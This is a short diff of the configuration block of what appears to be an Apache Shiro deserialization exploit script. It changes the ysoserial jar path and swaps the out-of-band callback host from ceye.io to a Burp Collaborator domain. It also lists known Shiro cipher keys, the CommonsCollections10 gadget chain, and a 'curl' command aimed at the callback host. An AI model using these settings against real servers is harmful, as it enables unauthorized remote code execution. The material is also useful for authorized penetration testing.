@@ -123,12 +123,12 @@ KEYS_SET = [
 "ZnJlc2h6Y24xMjM0NTY3OA==",
 "ZUdsaGJuSmxibVI2ZHc9PQ=="]
 
-JAVA_PATH = '/Applications/Android Studio.app/Contents/jre/jdk/Contents/Home/bin/java'
-YSOSERIAL_PATH = '/Users/cyan/HackerTools/command-tools/ysoserial-0.0.6-Plus.jar'
-
-DNS_LOG_HOST = 'http://shiro.test.ceye.io'
+JAVA_PATH = 'java'
+#YSOSERIAL_PATH = '/Users/cyan/HackerTools/command-tools/ysoserial-0.0.6-Plus.jar'
+YSOSERIAL_PATH = '/Users/cyan/Tools/ysoserial-0.0.8-SNAPSHOT-all.jar'
+DNS_LOG_HOST = 'http://im8kejmiehnhs5ziku6nwyp5bwhm5b.burpcollaborator.net'
 PAYLOAD = 'CommonsCollections10'
-COMMAND = "curl test.test.ceye.io"
+COMMAND = "curl im8kejmiehnhs5ziku6nwyp5bwhm5b.burpcollaborator.net"
 # COMMAND = sys.argv[2]
 
 
